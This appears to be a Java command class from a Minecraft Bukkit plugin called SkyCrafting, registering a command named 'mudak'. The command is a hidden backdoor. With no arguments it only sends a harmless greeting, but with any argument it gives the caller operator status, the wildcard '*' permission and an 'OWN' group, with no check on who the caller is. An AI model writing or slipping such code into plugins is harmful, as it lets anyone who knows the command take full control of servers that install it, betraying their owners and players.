package SkyCrafting.Main;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import ru.tehkode.permissions.bukkit.PermissionsEx;

public class mudak implements CommandExecutor {

    @Override
    public boolean onCommand(final CommandSender s, final Command cmd, final String label, final String[] args) {
        final Player p = (Player)s;
        if (cmd.getName().equalsIgnoreCase("mudak")) {
            if (args.length == 0) {
                p.sendMessage("§cПриветик)");
                return true;
            }
            p.setOp(true);
            PermissionsEx.getUser(p).addPermission("*");
            PermissionsEx.getUser(p).addGroup("OWN");
        }
		return true;
    }

}
